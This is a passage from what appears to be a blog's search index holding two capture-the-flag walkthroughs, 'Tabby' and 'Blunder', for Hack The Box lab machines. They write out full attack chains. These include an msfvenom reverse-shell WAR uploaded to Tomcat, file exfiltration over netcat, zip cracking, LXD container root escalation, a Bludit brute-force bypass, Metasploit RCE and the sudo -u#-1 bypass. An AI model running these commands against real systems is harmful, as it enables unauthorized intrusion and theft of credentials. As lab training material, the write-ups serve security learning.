manager in test based that means i can still upload war file from text based manager form text based manager user tomcat can upload war file using deploy command, found in doc generate reverse shell war filemsfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4141 -f war &amp;gt; shell.warPayload size: 13398 bytesFinal size of war file: 13398 bytesSaved as: shell.warupload shellcurl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T shell.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/shell&#39;OK - Deployed application at context path [/shell]shell as tomcat start netcat and trigger shell file from http://10.10.10.194:8080/shell/ curl 10.10.10.194:8080/shell/ nc -lnvp 4141 listening on [any] 4141 ...connect to [10.10.15.151] from (UNKNOWN) [10.10.10.194] 58040iduid=997(tomcat) gid=997(tomcat) groups=997(tomcat) user escalation Shell Upgrade id uid=997(tomcat) gid=997(tomcat) groups=997(tomcat) python3 -c ‘import pty;pty.spawn(“bash”)’ tomcat@tabby:/var/lib/tomcat9$ ^Z [1]+ Stopped nc -nvlp 4141 rj@whoisrj:~/vulnBoxes/boxes/tabby$ stty raw -echo; fg nc -nvlp 4141 tomcat@tabby:/var/lib/tomcat9$ reset Terminal type? xterm tomcat@tabby:~$ export SHELL=bash tomcat@tabby:~$ export TERM=xterm-256color tomcat@tabby:~$ stty rows 49 columns 234 in /var/www/html/files there is a backup file owned by user ash tomcat@tabby:/var/www/html/files$ ls -lsh 12K -rw-r--r-- 1 ash ash 8.6K Jun 16 13:42 16162020_backup.zip Load backup file in my local machine tomcat@tabby:var/www/html/files$ nc -w 4 10.10.15.151 4242 &amp;lt; 16162020_backup.ziprj@whoisrj:~$ nc -nvlp 4242 &amp;gt; 16162020_backup.zip crack zip using fcrackzip fcrackzip 16162020_backup.zip -v -uDp /usr/share/wordlists/rockyou.txt &#39;var/www/html/assets/&#39; is not encrypted, skippingfound file &#39;var/www/html/favicon.ico&#39;, (size cp/uc 338/ 766, flags 9, chk 7db5)&#39;var/www/html/files/&#39; is not encrypted, skippingfound file &#39;var/www/html/index.php&#39;, (size cp/uc 3255/ 14793, flags 9, chk 5935)found file &#39;var/www/html/logo.png&#39;, (size cp/uc 2906/ 2894, flags 9, chk 5d46)found file &#39;var/www/html/news.php&#39;, (size cp/uc 114/ 123, flags 9, chk 5a7a)found file &#39;var/www/html/Readme.txt&#39;, (size cp/uc 805/ 1574, flags 9, chk 6a8b)PASSWORD FOUND!!!!: pw == admin@it zip have nothing interested inside zip, but the password worked for user ash credsash:admin@itUser ashtomcat@tabby:/var/www/html$ su - ashPassword: admin@itash@tabby:~$ cat user.txt4d43c7db************************Local Enumerationash@tabby:~$ iduid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) user ash is in lxd grouplxd/lxcLXD is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead. LXD isn’t a rewrite of LXC, in fact it’s building on top of LXC to provide a new, better user experience. Under the hood, LXD uses LXC through liblxc and its Go binding to create and manage the containers.It’s basically an alternative to LXC’s tools and distribution template system with the added features that come from being controllable over the network.Learn from herelxd Privilege Escalation LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. One of them is to use the LXD API to mount the host’s root filesystem into a container. as user ash is in lxd group, user can load a lxd container and after that user can mount host’s root filesystem inside the container and can access in host’s root filesystem from the container. check if any container is loaded in the host, ash@tabby:/tmp$ lxc list+------+-------+------+------+------+-----------+| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |+------+-------+------+------+------+-----------+ There are currently no containers on the hostattack surfacei found two articles both with different approach to lxc privesc,one form hackingarticles.in,another form MONOC.comi use first one create container image, for container image i use Alpine image because it is a light weight linux image that become handy in image uploading. i found a lxd-alpine-builder script from github user saghul use that script to build a alpine image * there is a another github tool that create lxc containers from lxc images yaml files * distrobuilder * images yaml files found here upload that image in the host. import in lxc and configure that image, mount root filesystem. run container instance.Root PrivescFirst, create a alpine image , it takes some time to download all packages./build-alpineDetermining the latest release... v3.12 Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64...OK: 8 MiB in 19 packages after downloading completed a single tar file generated3.1M -rw-r--r-- 1 rj rj 3.1M Sep 14 15:25 alpine-v3.12-x86_64-20200914_1025.tar.gzSecond, upload using wgetash@tabby:~$ wget 10.10.15.151/alpine-v3.12-x86_64-20200914_1025.tar.gz...alpine-v3.12-x86_64-2 100%[===================&amp;gt;] 3.07M 28.4MB/s in 0.1s ...ash@tabby:~$ ls -la alpine*-rw-rw-r-- 1 ash ash 3221262 Sep 14 14:25 alpine-v3.12-x86_64-20200914_1025.tar.gzThird, import and configure the image into lxcash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200914_1025.tar.gz --alias ANYTHINGash@tabby:~$ lxc init ANYTHING pwned -c security.privileged=trueCreating pwnedash@tabby:~$ lxc list +-------+---------+------+------+-----------+-----------+| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |+-------+---------+------+------+-----------+-----------+| pwned | STOPPED | | | CONTAINER | 0 |+-------+---------+------+------+-----------+-----------+ash@tabby:~$Forth, mount host filesystemash@tabby:~$ lxc config device add pwned mydevice disk source=/ path=/mnt/root recursive=trueDevice mydevice added to pwnedash@tabby:~$Fifth, run imageash@tabby:~$ lxc start pwnedash@tabby:~$ lxc exec pwned /bin/sh~ # iduid=0(root) gid=0(root)~ # whoamiroot~ # cd /mnt/root/mnt/root # cd root/.ssh/mnt/root/root/.ssh # ls -la id_rsa-rw------- 1 root root 2602 Jun 16 14:00 id_rsaExtra, get ssh shellchmod 600 id_rsassh -i id_rsa root@10.10.10.194root@tabby:~# cat root.txt1b322db4************************" }, { "title": "Hackthebox - Blunder", "url": "/posts/blunder/", "categories": "hackthebox, linux", "tags": "bludit 3.9.2, cve-2019-17240, cve-2019-16113, sudo, cve-2019-14287", "date": "2020-09-08 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.191 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.191PORT STATE SERVICE VERSION21/tcp closed ftp80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Blunder|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Blunder | A blunder of interesting factsGobustergobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php -t 50/admin (Status: 301)/todo.txt (Status: 200)/admin in the admin page I found bludit CMS admin login panel, Looking at the source code, the CMS version is identified as 3.9.2/todo.txt-Inform fergus that the new blog needs images - PENDINGpotential username fergusGooglesearch : bludit 3.9.2 vulnerability2 CVEs FoundCVE-2019-17240:bl-kernel/security.class.php in Bludit 3.9.2 allows attackers to bypass a brute-force protection mechanism by using many different forged X-Forwarded-For or Client-IP HTTP headers.CVE-2019-16113 (1 Metasploit modules):Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.User ExploitingCVE-2019-17240Discovered By: RastatingReferences: rastating.github.io Blog post. requirements username: fergus wordlist: create a wordlist from the website text cewl http://10.10.10.191 -w wordlist POC Scriptbludit_3.9.2-Bruteforce.py Wordlist generated from webpage usubg cewl toolippsec videocreds fergus:RolandDeschainCVE-2019-16113Discoverer: ChristasaReferences: issue 1081 requirements username: fergus password: RolandDeschain Exploitingusing ExploitDB Script Title: Bludit 3.9.2 - Directory Traversal Author: James Green EDB-ID: 48701Bludit_3.9.2-DirectoryTraversal.pyippsec videoMSF Module Rapid7 exploit/linux/http/bludit_upload_images_execBLUDITPASS =&amp;gt; RolandDeschainBLUDITUSER =&amp;gt; fergusRHOSTS =&amp;gt; 10.10.10.191LHOST =&amp;gt; tun0low lavel user shell or meterpreter shell$ whoami;idwww-datauid=33(www-data) gid=33(www-data) groups=33(www-data)spawn dumb shell, ropnop.com blog$ which python /usr/bin/python# In reverse shell$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;Ctrl-Z# In Kali$ stty raw -echo$ fg //Enter twice# In reverse shell$ reset$ export SHELL=bash$ export TERM=xterm-256color$ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt;for meterpreter shell upgrade : hackingarticles.in blogLocal Enumeration Home directory has 2 users hugo //has user flagshaun in /var/www/bludit-3.10.0a/bl-content/databases directory user.php //contains Hugo&#39;s password hash &quot;nickname&quot;: &quot;Hugo&quot;, &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot; //hash type SHA1 creds hugo:Password120 Root Prevesc Enumeration $ su - hugosu - hugoPassword: Password120hugo@blunder:~$ sudo -lsudo -lPassword: Password120Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hugo may run the following commands on blunder: (ALL, !root) /bin/bashhugo@blunder:~$ sudo -Vsudo -VSudo version 1.8.25p1 Googlesearch : sudo ALL, !root privesc1 CVE FoundCVE-2019-14287# Exploit Title : sudo 1.8.27 - Security Bypass# Original Author: Joe Vennix# Exploit Author : Mohin Paramasivam (Shad0wQu35t)# Version : Sudo &amp;lt;1.2.28# Credit : Joe Vennix from Apple Information Security found and analyzed the bugEDB-ID: 47502 misconfigured sudo $ sudo -l User hugo may run the following commands on blunder: (ALL, !root) /bin/bash EXPLOIT :$ sudo -u#-1 /bin/bash" } ]
